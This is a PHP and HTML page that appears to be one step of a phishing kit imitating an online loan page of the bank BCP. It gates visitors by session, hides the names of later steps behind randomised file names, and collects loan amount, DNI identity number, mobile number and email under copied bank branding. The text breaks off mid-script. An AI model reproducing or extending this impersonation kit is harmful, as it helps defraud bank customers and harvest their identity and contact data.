<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_four.php";

$next_location_encrypted = $directory_array[$next_location].".php";

?>

<!DOCTYPE html>
<html lang="en" class="hydrated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Dinero al instante | Pide un préstamo BCP online</title>
    <link rel="stylesheet" href="files/main.css">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="files/favicon.ico" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="files/stylo.css">
	<style>
		.placeholder {
    		position: absolute;
    		top: 50%;
    		left: 10px;
    		transform: translateY(-50%);
    		color: #999;
	    	font-size: 16px;
			font-weight:600;
    		transition: top 0.3s, font-size 0.3s;
    		pointer-events: none;
			background: white;
    		padding-left: 5px;
        	padding-right: 5px;
		}
		
		.placeholder.enfocado {
    		top: 0;
			font-size: 12px;
			color: #0a47f0;
			font-weight:600;
		}
		
		.transparent {
			display: none;
		}

	</style>
	<style>
        #bodyloader {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background-color: var(--primary-700, #002a8d);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            position: relative;
            width: 70px;
            height: 70px;
            border: 3px solid #002376;
            border-top: 3px solid var(--secondary-500, #ff7800);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .image {
            width: 30px;
            height: 30px;
            background-image: url("files/favicon.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
		
		.step-point {
    		width: 10px;
    		height: 10px;
    		background-color: var(--onsurface-200); /* Color por defecto */
    		border-radius: 50%;
    		display: inline-block;
    		margin: 0 5px; /* Espacio entre los puntos */
		}		

		.step-point.active {
    		background-color: var(--primary-300); /* Color del paso activo, cambia esto según el color del paso 1 */
		}
	
    </style>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
	<div class="loading-screen" style="display:none;" id="bodyloader" style="height: 100%; margin: 0; overflow: hidden; background-color: var(--primary-700, #002a8d); display: none; align-items: center; justify-content: center;">
	 <div class="spinner-container">
		 <div class="image" style="top: 52px; width: 25px; position: relative;"></div>
		 <div class="spinner"></div>
		 <p class="message" style="text-align: center; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important; font-size: 13px; color: white; margin-top: 10px;">Espere un momento <br> por favor</p>
	 </div>
	</div>

<div id="bodyapp">
<eva-root _nghost-hbf-c0="" ng-version="7.2.16">
    <bcp-layout _ngcontent-hbf-c0="" fixed-menu="" ignore-scroll="" class="hydrated">
        <section class="layout">
            <bcp-navbar menu-position="right" is-fixed="" class="hydrated">
				<nav class="navbar navbar-expand-sm bg-primary-700 navbar-dark fixed-top" style="min-height: 60px; display: flex; justify-content: space-between;">
					<div class="container" style="width: 85%;">
            			<a class="brand-margin-left navbar-brand">
                			<bcp-img class="hydrated">
                    			<img alt="Dinero al instante" src="files/dark-default.svg" class="hydrated">
                			</bcp-img>
            			</a>
        			</div>
        			<div id="hamburg" style="position: relative; right: 16px;">
            			<svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                			<path fill-rule="evenodd" clip-rule="evenodd" d="M25.3334 10.6667H6.66671C5.93033 10.6667 5.33337 10.0697 5.33337 9.33333C5.33337 8.59695 5.93033 8 6.66671 8H25.3334C26.0698 8 26.6667 8.59695 26.6667 9.33333C26.6667 10.0697 26.0698 10.6667 25.3334 10.6667ZM25.3334 17.3333H6.66671C5.93033 17.3333 5.33337 16.7364 5.33337 16C5.33337 15.2636 5.93033 14.6667 6.66671 14.6667H25.3334C26.0698 14.6667 26.6667 15.2636 26.6667 16C26.6667 16.7364 26.0698 17.3333 25.3334 17.3333ZM6.66671 24H25.3334C26.0698 24 26.6667 23.403 26.6667 22.6667C26.6667 21.9303 26.0698 21.3333 25.3334 21.3333H6.66671C5.93033 21.3333 5.33337 21.9303 5.33337 22.6667C5.33337 23.403 5.93033 24 6.66671 24Z" fill="white"></path>
            			</svg>
        			</div>
    			</nav>
			</bcp-navbar>
            <bcp-sidebar position="right" class="hydrated">
                <aside class="sidebar">
                    <div>
                        <bcp-menu _ngcontent-hbf-c0="" slot="sidebar-content" class="inline-menu hydrated">
                            <ul class="navbar-nav">
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Obtén tu préstamo </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Beneficios </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                                <bcp-menu-option _ngcontent-hbf-c0="" class="hydrated">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <bcp-character class="hydrated">
                                                <p class="character-md bcp-font-demi white">Cómo funciona </p>
                                            </bcp-character>
                                        </a>
                                    </li>
                                </bcp-menu-option>
                            </ul>
                        </bcp-menu>
                    </div>
                </aside>
                <div class="sidebar-backdrop fade"></div>
            </bcp-sidebar>
            <main class="layout-content">
                <div _ngcontent-hbf-c0="" class="container">
                    <div _ngcontent-hbf-c0="" class="row">
                        <div _ngcontent-hbf-c0="" class="col">
                            <div _ngcontent-hbf-c0="" class="steppers"></div>
                        </div>
                    </div>
                </div>
                <router-outlet _ngcontent-hbf-c0=""></router-outlet>
                <eva-home _nghost-hbf-c1="">
                    <eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="">
                        <div _ngcontent-hbf-c2="" class="banner" style="background-color: var(--primary-700); background-size: auto 361px; padding-bottom: 68px; clip-path: ellipse(100% 100% at 37% -15%); background-image: none;">
                            <div _ngcontent-hbf-c2="" class="container" style="padding-top: 26px !important;">
                                <div _ngcontent-hbf-c2="" class="row">
                                    <div _ngcontent-hbf-c2="" class="col-md-6 order-md-2 d-flex justify-content-start align-items-start" style="bottom:10px;">
                                        <h1 _ngcontent-hbf-c2="" class="text-center d-none d-md-block">
                                            <span _ngcontent-hbf-c2="" class="bold" style="">¡Pide tu préstamo 100% online</span>
                                            <br _ngcontent-hbf-c2="">y recíbelo en tu cuenta al instante!
                                        </h1>
                                        <h1 _ngcontent-hbf-c2="" class="text-center d-block d-md-none" style="position:relative; top:28px;">
                                            <span _ngcontent-hbf-c2="" class="bold" style="font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important;">Solicita tu</span>
                                        </h1>
										<br>
										
                                    </div>
                                    <div _ngcontent-hbf-c2="" class="col-md-6 order-md-1 d-flex justify-content-center justify-content-md-end">
										<h1 _ngcontent-hbf-c2="" class="text-center d-block d-md-none" style="position:relative; top:5px;margin-right: auto;text-align:start !important;">
                                            <span _ngcontent-hbf-c2="" class="bold" style="font-family: var(--bcp-font-family-primary-demi, 'Flexo-Demi'),helvetica,arial,sans-serif!important; line-height: 1.25!important; font-size: 32px;">Préstamo <br> 100% online</span>
											<br>
											<br>
											<span _ngcontent-hbf-c2="" class="bold" style="font-family: var(--bcp-font-family-primary-demi, 'Flexo-Demi'),helvetica,arial,sans-serif!important; font-size: 1rem; font-weight: 400; line-height: 1.5; bottom: 7px; margin-bottom: 0!important; position: relative;">y recíbelo al instante</span>
                                        </h1>
                                        <div _ngcontent-hbf-c2="" style="bottom: 22px; right: 10px; position: relative;">
                                            <picture _ngcontent-hbf-c2="" class="banner-start-image">
                                                <img _ngcontent-hbf-c2="" alt="" class="banner-start-image" src="files/spotorange.svg">
                                            </picture>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-banner>
                    <eva-loan-request-form _ngcontent-hbf-c1="" _nghost-hbf-c3="">
                        <div _ngcontent-hbf-c3="" class="container" style="margin-top:0px">
                            <div _ngcontent-hbf-c3="" class="row">
                                <div _ngcontent-hbf-c3="" class="col">
                                    <div _ngcontent-hbf-c3="" class="card" style="border: none;">
                                        <div _ngcontent-hbf-c3="" class="card-body" style="padding: 0;">
                                            <form class="ng-untouched ng-pristine ng-invalid">
                                                <div _ngcontent-hbf-c3="" class="row align-items-center">
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
																		<div class="input-container" style="position: relative;">
																			<input class="form-control" autocomplete="off" required id="monto" name="monto" type="tel" maxlength="10" onkeypress="return tipoFiltro(event)" onfocus="onfocusMonto(this)" onblur="onblurMonto(this)" onkeyup="keyupMonto(this)" style="border:1px solid var(--onsurface-300,#bfc4cc)">
																			<label id="montolabel" for="monto" class="placeholder" style="color:var(--onsurface-800, #606c7f);">Ingresa tu monto</label>
																		</div>
																		<p id="alertamonto" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 13px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400; padding: 0 16px; text-align: left !important;display:none;"></p>
																	</div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
																		<div class="input-container" style="position: relative;">
																			<input class="form-control" autocomplete="off" required id="dni" name="dni" type="tel" maxlength="8" onkeypress="return tipoFiltro(event)" onfocus="onfocusDni(this)" onblur="onblurDni(this)" onkeyup="keyupDni(this)" style="border:1px solid var(--onsurface-300,#bfc4cc)">
																			<label id="labeldni" for="dni" class="placeholder" style="color:var(--onsurface-800, #606c7f);">Ingresa tu dni</label>
																		</div>
																		<p id="alertadni" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 13px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400; padding: 0 16px; text-align: left !important;display:none;"></p>
																	</div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
													<div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
																		<div class="input-container" style="position: relative;">
																			<input class="form-control" autocomplete="off" required id="tlf" name="tlf" type="tel" maxlength="9" pattern="[9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]" onkeypress="return tipoFiltro(event)" onfocus="onfocusTlf(this)" onblur="onblurTlf(this)" onkeyup="keyupTlf(this)" style="border:1px solid var(--onsurface-300,#bfc4cc)">
																			<label id="labeltlf" for="tlf" class="placeholder" style="color:var(--onsurface-800, #606c7f);">Ingresa tu celular</label>
																		</div>
																		<p id="alertatlf" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 13px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400; padding: 0 16px; text-align: left !important;display:none;"></p>
																	</div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
                                                                        <div class="input-container" style="position: relative;">
                                                                            <input class="form-control" autocomplete="off" required id="email" name="email" type="text" onfocus="onfocusEmail(this)" onblur="onblurEmail(this)" onkeyup="keyupEmail(this)" style="border:1px solid var(--onsurface-300,#bfc4cc)">
                                                                            <label id="labelemail" for="email" class="placeholder" style="color:var(--onsurface-800, #606c7f);">Ingresa tu correo</label>
                                                                        </div>
                                                                        <p id="alertaemail" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 13px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400; padding: 0 16px; text-align: left !important;display:none;"></p>
                                                                    </div>
                                                                    <bcp-paragraph class="helper-text hydrated">
                                                                        <p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md-auto" style="margin-top:10px;">
														<div _ngcontent-hbf-c3="" class="row flex-column" style="align-items: center;">
															<div _ngcontent-hbf-c3="" class="col submit-col p-lg-0" style="align-items: center; position: relative; text-align: center;">
																<bcp-button _ngcontent-hbf-c3="" size="lg" class="hydrated" style="display: inline-block;width:60%;">
																	<button type="button" class="btn btn-primary btn-lg btn-block" onclick="post(1);">
																		<bcp-paragraph class="hydrated">
																			<p class="paragraph-lg bcp-font-demi white">Empezar </p>
																		</bcp-paragraph>
																		<bcp-icon _ngcontent-hbf-c3="" name="arrow-right-r" slot="end" class="hydrated">
																			<i class="icon arrow-right-r "></i>
																		</bcp-icon>
																	</button>
																</bcp-button>
															</div>
														</div>
													</div>
                                                </div>
                                                <p id="alerta" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; font-size: 0.9rem; display: none;"></p>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-loan-request-form>
                    <eva-business-hours _ngcontent-hbf-c1="" _nghost-hbf-c4="" style="top:20px;position:relative;">
                        <div _ngcontent-hbf-c4="" class="container-fluid" style="margin-top:20px;width: 90%; border-radius: 8px;display:flex;align-items: center; justify-content: center; text-align: center; margin-top: 20px; width: 90%; border-radius: 8px; display: flex;">
							<i aria-hidden="true" class="icon clock-r primary-700" style="font-size: 20px;"></i>
                            <p _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="font-size:11px;left: 10px; position: relative;">Horario de atención <span _ngcontent-hbf-c4="" style="font-family:var(--bcp-font-family-primary-bold, 'Flexo-Bold'),helvetica,arial,sans-serif; font-weight:500;">Lun a Dom de 6am - 10pm.</span></p>
                        </div>
                    </eva-business-hours>
                    <eva-benefits _ngcontent-hbf-c1="" _nghost-hbf-c5="">
                        <div _ngcontent-hbf-c5="" class="container mt-0 text-center" id="test" style="position: relative; padding-top: 100px;">
                            <div _ngcontent-hbf-c5="" class="row">
                                <div _ngcontent-hbf-c5="" class="col text-center">
                                    <h2 _ngcontent-hbf-c5="">Beneficios</h2>
                                    
                                </div>
                            </div>
                            <div _ngcontent-fiu-c27="" class="row flex-column flex-md-row mbp-md-64" style="padding-top:30px;">
								<div _ngcontent-fiu-c27="" class="col-12 col-md-4 mb-3 mb-md-0">
									<app-benefit-card _ngcontent-fiu-c27="" spot="" title="" _nghost-fiu-c26="">
										<div _ngcontent-fiu-c26="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
											<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-md-center">
												<div _ngcontent-fiu-c26="" class="col-auto mb-md-3"><img _ngcontent-fiu-c26="" class="spot" src="files/flexibilidad.svg" style="width:55px;height:55px;">
												</div>
												<div _ngcontent-fiu-c26="" class="col pl-0 pl-md-3">
													<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-center text-md-center h-100">
														<div _ngcontent-fiu-c26="" class="col">
															<p _ngcontent-fiu-c26="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3" style="text-align:start;">Flexibilidad de montos</p>
														</div>
														<div _ngcontent-fiu-c26="" class="col d-none d-md-block">
															<p _ngcontent-fiu-c26="" class="mb-md-0">Montos desde S/ 100 hasta <br _ngcontent-fiu-c27=""> S/ 350,000</p>
														</div>
													</div>
												</div>
											</div>
										</div>
									</app-benefit-card>
								</div>
								<div _ngcontent-fiu-c27="" class="col-12 col-md-4 mb-3 mb-md-0">
									<app-benefit-card _ngcontent-fiu-c27="" title="Flexibilidad de montos" _nghost-fiu-c26="">
										<div _ngcontent-fiu-c26="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
											<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-md-center">
												<div _ngcontent-fiu-c26="" class="col-auto mb-md-3"><img _ngcontent-fiu-c26="" class="spot" src="files/ahorratiempo.svg" style="width:55px;height:55px;">
												</div>
												<div _ngcontent-fiu-c26="" class="col pl-0 pl-md-3">
													<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-center text-md-center h-100">
														<div _ngcontent-fiu-c26="" class="col">
															<p _ngcontent-fiu-c26="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3" style="text-align:start;">Ahorra tiempo</p>
														</div>
														<div _ngcontent-fiu-c26="" class="col d-none d-md-block">
															<p _ngcontent-fiu-c26="" class="mb-md-0">Montos desde S/ 100 hasta <br _ngcontent-fiu-c27=""> S/ 350,000</p>
														</div>
													</div>
												</div>
											</div>
										</div>
									</app-benefit-card>
								</div>
								<div _ngcontent-fiu-c27="" class="col-12 col-md-4 mb-3 mb-md-0">
									<app-benefit-card _ngcontent-fiu-c27="" spot="/assets/illustrations/spot_circle/svg/spc_ empathy_hand_d_l.svg" title="Flexibilidad de montos" _nghost-fiu-c26="">
										<div _ngcontent-fiu-c26="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
											<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-md-center">
												<div _ngcontent-fiu-c26="" class="col-auto mb-md-3"><img _ngcontent-fiu-c26="" class="spot" src="files/pagoautomatico.svg" style="width:55px; height:55px;">
												</div>
												<div _ngcontent-fiu-c26="" class="col pl-0 pl-md-3">
													<div _ngcontent-fiu-c26="" class="row flex-md-column align-items-center text-md-center h-100">
														<div _ngcontent-fiu-c26="" class="col">
															<p _ngcontent-fiu-c26="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3" style="text-align:start;">Pago automático</p>
														</div>
														<div _ngcontent-fiu-c26="" class="col d-none d-md-block">
															<p _ngcontent-fiu-c26="" class="mb-md-0">Montos desde S/ 100 hasta <br _ngcontent-fiu-c27=""> S/ 350,000</p>
														</div>
													</div>
												</div>
											</div>
										</div>
									</app-benefit-card>
								</div>
							</div>
                        </div>
                    </eva-benefits>
                    <eva-tutorial _ngcontent-hbf-c1="" _nghost-hbf-c6="" >
                        <div _ngcontent-hbf-c6="" class="tutorial-background" style="background:none;">
                            <div _ngcontent-hbf-c6="" class="container text-center">
                                <div _ngcontent-hbf-c6="" class="row" style="display:block;margin-bottom:30px;">
                                    <div _ngcontent-hbf-c6="" class="col" style="margin-bottom:50px;">
                                        <h2 _ngcontent-hbf-c6="">Tu préstamo en simples pasos</h2>
                                        
                                    </div>
									<p _ngcontent-fiu-c32="" class="text-center bcp-font-demi fs-12 onsurface-800 mb-1" id="stepText2" style="color: var(--onsurface-800,#606c7f); font-family: var(--bcp-font-family-primary-demi, 'Flexo-Demi'),helvetica,arial,sans-serif; text-align: center!important; font-size: 1rem; font-weight: 400; line-height: 1.5;">1 de 6</p>
									<p _ngcontent-fiu-c32="" class="text-center bcp-font-demi" id="stepDescription">Ingresa tu monto y fecha de pago</p>
                                </div>
								<div _ngcontent-fiu-c32="" class="row h-100 align-items-center no-gutters mb-4">
									<div _ngcontent-fiu-c32="" class="col-auto" id="prevBtn">
										<div _ngcontent-fiu-c32="" class="border rounded-circle d-flex justify-content-center align-items-center pointer">
											<bcp-icon _ngcontent-fiu-c32="" name="arrow-left-r" size="20" color="secondary-500" class="p-2 p-md-3 bcp-font-demi hydrated">
												<i aria-hidden="true" class="icon arrow-left-r secondary-500" style="font-size: 20px;"></i>
												<span class="sr-only">arrow-left</span>
											</bcp-icon>
										</div>
									</div>
									<div _ngcontent-fiu-c32="" class="col">
										<img _ngcontent-fiu-c32="" alt="" src="files/paso1.svg" class="w-100 active">
										<img _ngcontent-fiu-c32="" alt="" src="files/paso2.svg" class="transparent w-100" >
										<img _ngcontent-fiu-c32="" alt="" src="files/paso3.svg" class="transparent w-100" >
										<img _ngcontent-fiu-c32="" alt="" src="files/paso4.svg" class="transparent w-100" >
										<img _ngcontent-fiu-c32="" alt="" src="files/paso5.svg" class="transparent w-100" >
										<img _ngcontent-fiu-c32="" alt="" src="files/paso6.svg" class="transparent w-100" ><!---->
									</div>
									<div _ngcontent-fiu-c32="" class="col-auto" id="nextBtn">
										<div _ngcontent-fiu-c32="" class="border rounded-circle d-flex justify-content-center align-items-center pointer">
											<bcp-icon _ngcontent-fiu-c32="" name="arrow-right-r" size="20" color="secondary-500" class="p-2 p-md-3 bcp-font-demi hydrated">
												<i aria-hidden="true" class="icon arrow-right-r secondary-500" style="font-size: 20px;"></i>
												<span class="sr-only">arrowight</span>
											</bcp-icon>
										</div>
									</div>
								</div>
								<div class="text-center">
									<div id="stepPoints">
										<span class="step-point active"></span>
        								<span class="step-point"></span>
        								<span class="step-point"></span>
										<span class="step-point"></span>
										<span class="step-point"></span>
										<span class="step-point"></span>
        								<!-- Agrega más puntos según sea necesario -->
    								</div>
								</div>
								<p _ngcontent-fiu-c32="" class="mb-0 bcp-font-demi text-center text-md-left" style="margin-top:20px;">¿Ya estás listo para solicitar tu préstamo 
									<br _ngcontent-fiu-c32="">online? 
									<span _ngcontent-fiu-c32="" class="bcp-font-regular">Haz clic </span>
									<span _ngcontent-fiu-c32="" id="cta" evaanalytics="" class="bcp-font-demi secondary-500 pointer">aquí</span>
								</p>
                                <div _ngcontent-hbf-c6="" class="row justify-content-center" style="height:50px;">
                                    <div _ngcontent-hbf-c6="" class="col col-md-10 col-lg-6">
                                        <div _ngcontent-hbf-c6="" class="embed-responsive embed-responsive-16by9"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-tutorial>
                    <eva-information _ngcontent-hbf-c1="" _nghost-hbf-c7="">
                        <div _ngcontent-hbf-c7="" class="container instrucciones text-center">
                            <div _ngcontent-hbf-c7="" class="row">
                                <div _ngcontent-hbf-c7="" class="col">
                                    <h2 _ngcontent-hbf-c6="">Preguntas frecuentes</h2>
                                </div>
                            </div>
                            <div _ngcontent-hbf-c7="" class="row">
                                <div _ngcontent-hbf-c7="" class="col start-conditions">
                                    <p _ngcontent-fiu-c28="" class="fs-14 fs-md-16 mbp-32 mb-md-0 onsurface-800" style="font-size:14px!important">Ante cualquier duda, comunícate con<br> nosotros a 
										<span _ngcontent-lud-c24="" class="bcp-font-demi">consultasbcp@bcp.com.pe.</span>
										<br>
										<br>También puedes resolver tus dudas por WhatsApp escribe al 993119898
									</p>
                                </div>
                            </div>
							<div _ngcontent-fiu-c33="" class="col col-md-11 mbp-32 mbp-md-40" style="padding-right:16px; padding-left:16px;">
								<app-cta _ngcontent-fiu-c33="" _nghost-fiu-c29="">
									<div _ngcontent-fiu-c29="" class="container bg-primary-700 rounded" style="padding: 22px 0 56px;">
										<div _ngcontent-fiu-c29="" class="row no-gutters">
											<div _ngcontent-fiu-c29="" class="col">
												<div _ngcontent-fiu-c29="" class="row justify-content-center justify-content-md-between align-items-center">
													<div _ngcontent-fiu-c29="" class="col-auto mb-3 mb-md-0">
														<img _ngcontent-fiu-c29="" src="files/girlwithphone.svg" alt="" style="display:flex;">
													</div>
													<div _ngcontent-fiu-c29="" class="col-auto" style="display: flex; align-items: center;">
														<h2 _ngcontent-fiu-c29="" class="h1-md white text-center text-md-left mbp-32 mb-md-0" style="margin-bottom: 32px;">¡Que esperas! 
															<br _ngcontent-fiu-c29="" class="d-block d-md-none"> Adquiere tu
															<br _ngcontent-fiu-c29="" class="d-none d-md-block"> préstamo 
															<br _ngcontent-fiu-c29="" class="d-block d-md-none"> 100% online 
														</h2>
													</div>
													<div _ngcontent-fiu-c29="" class="col-auto">
														<bcp-button onclick="solicitatuprestamo()"  _ngcontent-fiu-c29="" tier="primary" size="lg" id="cta" evaanalytics="" class="hydrated"><!---->
														<button type="button" class="btn-primary btn btn-lg">
															<bcp-paragraph class="hydrated"><!---->
																<p class="paragraph-lg white bcp-font-demi">Solicita tu préstamo</p>
															</bcp-paragraph>
														</button>
														</bcp-button>
													</div>
												</div>
											</div>
										</div>
									</div>
								</app-cta>
							</div>
                        </div>
                    </eva-information>
                </eva-home>
                <bcp-footer _ngcontent-hbf-c0="" dark-theme="true" transparent="false" class="hydrated">
                    <footer class="footer">
                        <div class="container">
                            <bcp-footer-body _ngcontent-hbf-c0="" class="hydrated">
                                <div class="footer-body row no-gutters">
                                    <div class="col-sm-12 col-md-8 content-left">
                                        <ul class="list-items less">
                                            <bcp-img class="footer-logo hydrated">
                                                <img class="footer-logo hydrated" src="files/dark-grey.svg">
                                            </bcp-img>
                                        </ul>
                                        <ul class="list-items">
                                            <li>
                                                <bcp-paragraph class="hydrated">
                                                    <p class="paragraph-md bcp-font-regular onsurface-600">©2022 www.dineroalinstante.viabcp.com</p>
                                                </bcp-paragraph>
                                            </li>
                                            <li>
                                                <bcp-paragraph class="hydrated">
                                                    <p class="paragraph-md bcp-font-regular onsurface-600">Todos los derechos reservados</p>
                                                </bcp-paragraph>
                                            </li>
                                        </ul>
                                    </div>
                                    <div class="col-sm-12 col-md-4 content-left">
                                        <ul class="list-items">
                                            <bcp-button class="hydrated">
                                                <button type="button" class="btn btn-text-secondary">
                                                    <bcp-paragraph class="hydrated">
                                                        <p class="paragraph-md bcp-font-demi onsurface-600">
                                                            <span class="text-decoration"></span>
                                                        </p>
                                                    </bcp-paragraph>
                                                </button>
                                            </bcp-button>
                                        </ul>
                                        <ul class="list-items">
                                            <li>
                                                <bcp-paragraph class="hydrated">
                                                    <p class="paragraph-md bcp-font-regular onsurface-600">Buzón de consultas: consultasbcp@bcp.com.pe</p>
                                                </bcp-paragraph>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </bcp-footer-body>
                        </div>
                    </footer>
                </bcp-footer>
            </main>
            <section class="layout-footer"></section>
        </section>
    </bcp-layout>
</eva-root>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
	var label = document.getElementById("montolabel");
	function onfocusMonto(input) {
  		var valor = input.numericValue;
		// 1ra validación: Si el valor es igual a 0 o está vacío
		if (valor === 0 || input.value.trim() === "") {
			input.nextElementSibling.classList.add("enfocado");
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
    		input.style.border = "2px solid rgb(10, 71, 240)";
			$("#alertamonto").html("Este campo es requerido").hide();
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		
		// 2da validación: Si el valor es mayor que 99 y menor que 150001
		else if (!isNaN(valor) && valor > 99 && valor < 150001) {
			input.style.border = "2px solid rgb(10, 71, 240)";
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		// 3ra validación: Si no se cumple ninguna de las condiciones anteriores
		else {
			input.style.border = "2px solid #e30425";
			input.nextElementSibling.style.color = "#e30425";
			input.style.color = "var(--onsurface-800, #606c7f)";
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
	}
	
	function onblurMonto(input) {
		var valor = input.numericValue;
		if (valor === 0 || input.value.trim() === "" || input.value === "") {
			input.nextElementSibling.classList.remove("enfocado");
			input.nextElementSibling.style.color = "#e30425";
    		input.style.border = "1px solid #e30425";
			$("#alertamonto").html("Este campo es requerido").show();
		}
		else if (valor < 100 || valor > 150000) {
			input.style.border = "1px solid #e30425";
			input.nextElementSibling.style.color = "#e30425";
			input.style.color = "#e30425"; 
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
		else {
		input.style.border = "1px solid var(--onsurface-300,#bfc4cc)";
